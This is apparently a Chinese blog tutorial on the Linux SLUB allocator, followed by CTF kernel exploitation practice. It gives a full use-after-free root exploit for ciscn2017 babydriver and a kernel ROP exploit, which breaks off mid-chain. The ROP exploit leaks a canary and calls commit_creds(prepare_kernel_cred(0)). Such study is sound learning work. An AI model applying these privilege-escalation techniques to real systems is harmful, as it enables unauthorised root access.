<h1 id="了解slub分配器机制及其使用"><a href="#了解slub分配器机制及其使用" class="headerlink" title="了解slub分配器机制及其使用"></a>了解slub分配器机制及其使用</h1><p>有别用户空间，内核空间的内存使用通常都比较小巧，但是哪怕它是内核它也会需要使用内存</p>
<p>这就涉及到一些内存分配机制。</p>
<p>slub的前身是slab，</p>
<p>每一个申请的内核空间都是需要一个结构体进行管理的，这个结构体就是<code>kmem_cache</code></p>
<p>它由<code>kmem_cache_create()</code>创建，由<code>kmem_cache_destroy()</code>销毁</p>
<p>当然，这只是一个管理的结构体，并不储存数据，只是记录缓冲区的一些信息。</p>
<p>真正申请内存的是<code>kmem_cache_alloc()</code>,它申请出相应的内存，并将其数据(类似ptr,size)记录进<code>kmem_cache</code></p>
<p><code>kmem_cache_free</code>负责将申请的内存空间释放。</p>
<p>这里说一下，所有的kmem_cache都被串在一个名为slab_caches的双向链表上</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  	<span class="comment">/*per-cpu变量，用来实现每个CPU上的slab缓存。好处如下：</span></span><br><span class="line"><span class="comment">        1.促使cpu_slab-&gt;freelist可以无锁访问，避免了竞争，提升分配速度</span></span><br><span class="line"><span class="comment">        2.使得本地cpu缓存中分配出的objects被同一cpu访问，提升TLB对object的命中率(因为一个page中有多个object，他们共用同一个PTE)</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> __<span class="title">percpu</span> *<span class="title">cpu_slab</span>;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">/*下面这些是初始化kmem_cache时会设置的一些变量 */</span></span><br><span class="line">    	<span class="comment">/*分配时会用到的flags*/</span></span><br><span class="line">    	</span><br><span class="line">        <span class="type">slab_flags_t</span> flags;</span><br><span class="line">        </span><br><span class="line">    	<span class="comment">/*kmem_cache_shrink缩减partial slabs时，将被保有slab的最小值。由函数set_min_partial(s, ilog2(s-&gt;size)/2)设置。*/</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> min_partial;</span><br><span class="line">        </span><br><span class="line">    	<span class="comment">/*object的实际大小，包含元数据和对齐的空间*/</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> size;</span><br><span class="line">        </span><br><span class="line">    	<span class="comment">/*object中payload的大小，即目标数据结构的实际大小*/</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> object_size;</span><br><span class="line">    	<span class="comment">/*每个free object中都存了next free object的地址，但是并未存在object的首地址，而是首地址加上offset的地方*/</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> offset;</span><br><span class="line">	<span class="comment">/*此结构体实际是个unsigned int，里面存了单个slab的占用的order数和一个slab中object的数量*/</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">oo</span>;</span> </span><br><span class="line">        <span class="comment">/* Allocation and freeing of slabs */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">max</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">min</span>;</span></span><br><span class="line">        </span><br><span class="line">    	<span class="comment">/*标准gfp掩码，用于从buddy分配页面时*/</span></span><br><span class="line">        <span class="type">gfp_t</span> allocflags;       <span class="comment">/* gfp flags to use on each alloc */</span></span><br><span class="line">        <span class="type">int</span> refcount;           <span class="comment">/* Refcount for slab cache destroy */</span></span><br><span class="line">    	</span><br><span class="line">    	<span class="comment">/*object的构造函数，通常不使用*/</span></span><br><span class="line">        <span class="type">void</span> (*ctor)(<span class="type">void</span> *); </span><br><span class="line">    	<span class="comment">/*object中到metadata的偏移*/</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> inuse;</span><br><span class="line">    	<span class="comment">/*对齐大小。澄清：slab中对齐方式通常有两种。1是按处理器字长对齐;2是按照cacheline大小对齐。*/</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> align;</span><br><span class="line">        </span><br><span class="line">    	<span class="comment">/*若flags中使用REDZONE时有意义*/</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> red_left_pad;      <span class="comment">/* Left redzone padding size */</span></span><br><span class="line">        </span><br><span class="line">	<span class="comment">/*对象名称，例：mm_struct task_struct*/</span></span><br><span class="line">    	<span class="type">const</span> <span class="type">char</span> *name;      </span><br><span class="line">    	</span><br><span class="line">	<span class="comment">/*kmem_cache的链表结构，通过此成员串在slab_caches链表上*/</span></span><br><span class="line">    	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span> </span><br><span class="line">    	</span><br><span class="line">    	</span><br><span class="line">	<span class="comment">/*下面两个成员用于表示对象内部的一块空间，使userspace可以访问其中的内容。具体可以看kmem_cache_create_usercopy的实现*/</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> useroffset;  </span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> usersize;         </span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">	<span class="comment">/*每个node对应一个数组项，kmem_cache_node中包含partial slab链表*/</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">node</span>[<span class="title">MAX_NUMNODES</span>];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> &#123;</span></span><br><span class="line">    	<span class="comment">/*指向下面page指向的slab中的第一个free object*/</span></span><br><span class="line">        <span class="type">void</span> **freelist;      </span><br><span class="line">    	<span class="comment">/* Globally unique transaction id */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> tid;      </span><br><span class="line">    	<span class="comment">/*指向当前正在使用的slab*/</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span>      </span><br><span class="line">	<span class="comment">/*本地slab缓存池中的partial slab链表*/</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">partial</span>;</span> </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> &#123;</span></span><br><span class="line">    	<span class="comment">/*kmem_cache_node数据结构的自选锁，可能涉及到多核访问*/</span></span><br><span class="line">        <span class="type">spinlock_t</span> list_lock;</span><br><span class="line">    	<span class="comment">/*node中slab的数量*/</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> nr_partial;</span><br><span class="line">    	<span class="comment">/*指向partial slab链表*/</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">partial</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="CTF真题操练"><a href="#CTF真题操练" class="headerlink" title="CTF真题操练"></a>CTF真题操练</h1><h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><p>ciscn2017-babydriver</p>
<p>没有用户态传统的溢出等漏洞，但是存在一个为条件竞争引发的UAF漏洞</p>
<p>如果我们两次打开同一个设备，因为babydev_struct是全局的，第二次会覆盖掉第一次分配的空间。通样释放也是两个一起</p>
<p>通过UAF主要还是用来是修改cred结构体。修改uid,gid</p>
<p>当然，每一种情况都应当有独立的判断</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:root flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod /lib/modules/4.4.72/babydriver.ko</span><br><span class="line">chmod 777 /dev/babydev</span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>

<p>可以看到，init操作除了flag的权限设置，基本没什么安排特别的保护。</p>
<p>3</p>
<p>exp</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include&lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include&lt;stdlib.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include&lt;unistd.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include&lt;fcntl.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include&lt;stropts.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include&lt;sys/wait.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include&lt;sys/stat.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	int fd1 = open(&quot;/dev/babydev&quot;,2);//O_RDWR</span><br><span class="line">	int fd2 = open(&quot;/dev/babydev&quot;,2);</span><br><span class="line">	ioctl(fd1,0x10001,0xa8);</span><br><span class="line"></span><br><span class="line">	close(fd1);</span><br><span class="line">	int pid = fork();</span><br><span class="line">	if(pid &lt; 0)</span><br><span class="line">	&#123;</span><br><span class="line">		puts(&quot;[*] fork err!&quot;);</span><br><span class="line"></span><br><span class="line">		exit(0);</span><br><span class="line">	&#125;</span><br><span class="line">	else if (pid == 0 )</span><br><span class="line">	&#123;</span><br><span class="line">		char zeros[30] = &#123;0&#125;;</span><br><span class="line">		write(fd2,zeros,28);</span><br><span class="line"></span><br><span class="line">		if(getuid() == 0)</span><br><span class="line">		&#123;</span><br><span class="line">			puts(&quot;[+] root now&quot;);</span><br><span class="line">			system(&quot;/bin/sh;&quot;);</span><br><span class="line">			exit(0);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		wait(NULL);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	close(fd2);</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其实，如果单看别人，整个逻辑都还能理解，但是里面其实有很多细节，在我看到的众多博客都是以这道题做的基础讲解，基本上都能把原理说通。但是…..</p>
<p>比如说</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">char zeros[30] = &#123;0&#125;;</span><br><span class="line">write(fd2,zeros,28);</span><br></pre></td></tr></table></figure>

<p>这一段，就没说，知道作用，但是没说为什么这么大</p>
<h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc exp.c -static -masm=intel -g -o exp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>,prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;<span class="comment">//it is the base_addr if there is no kaslr protect.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	FILE *kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="comment">//read the addr of the func_s</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;[*] open kallsyms error!\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">while</span>(fgets(buf,<span class="number">0x30</span>,kallsyms_fd))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)<span class="comment">//strstr ==&gt; search for the chars</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;<span class="comment">//store the func_addr with hex</span></span><br><span class="line">			<span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);<span class="comment">//copy the addr from buf to hex</span></span><br><span class="line">			<span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;commit_creds);<span class="comment">//write the addr into the &amp;commit_creds(from chars to hex_num)</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">			vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;<span class="comment">//we could calc out the vmlinux_base from the func_addr</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr : %p\n&quot;</span>,vmlinux_base);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>( <span class="built_in">strstr</span>(buf,<span class="string">&quot;prepare_kernel_cred&quot;</span>)  &amp;&amp; !prepare_kernel_cred) <span class="comment">//</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">			<span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">			<span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;prepare_kernel_cred);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr : %p \n&quot;</span>,prepare_kernel_cred);</span><br><span class="line">			vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(! (prepare_kernel_cred &amp; commit_creds) )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;[*] Error!&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	__asm__(<span class="string">&quot;mov user_cs,cs;&quot;</span></span><br><span class="line">			<span class="string">&quot;mov user_ss,ss;&quot;</span></span><br><span class="line">			<span class="string">&quot;mov user_sp,rsp;&quot;</span></span><br><span class="line">			<span class="string">&quot;pushf;&quot;</span></span><br><span class="line">			<span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">			);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;[*] status has been ssaved!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off</span><span class="params">(<span class="type">int</span> fd,<span class="type">long</span> <span class="type">long</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] set off to %ld\n&quot;</span>,idx);</span><br><span class="line">	ioctl(fd,<span class="number">0x6677889c</span>,idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">int</span> fd ,<span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;[*] read to buf\n&quot;</span>);</span><br><span class="line">	ioctl(fd,<span class="number">0x6677889b</span>,buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">int</span> fd,<span class="type">long</span> <span class="type">long</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] copy from user with size:%ld\n&quot;</span>,size);</span><br><span class="line">	ioctl(fd,<span class="number">0x6677889a</span>,size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	save_status();</span><br><span class="line">	<span class="type">int</span> fd  = open(<span class="string">&quot;/proc/core&quot;</span>,<span class="number">2</span>);<span class="comment">//O_WR</span></span><br><span class="line">	<span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;[*] open /proc/core error!\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	find_symbols();</span><br><span class="line">	<span class="comment">//gadget = raw_gadget - raw_vmlinux_base + vmlinux_base;</span></span><br><span class="line">	<span class="type">ssize_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line"></span><br><span class="line">	set_off(fd,<span class="number">0x40</span>);<span class="comment">//////</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> buf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	core_read(fd,buf);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> canary  = ((<span class="type">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">	<span class="comment">//size_t canary  = (size_t *)(buf[0]); wrong way</span></span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> canary_ptr  = (<span class="type">size_t</span> *)(canary);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span> ; i &lt; <span class="number">10</span> ; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		rop[i] = canary;<span class="comment">//overflow the canary and the ebp</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//the least of the chain is rop we </span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)   </span></span><br><span class="line">    <span class="comment">//the value ret will be stored in rax</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//the rdx is &quot;pop rcx; ret&quot;</span></span><br><span class="line">    rop[i++] = <span 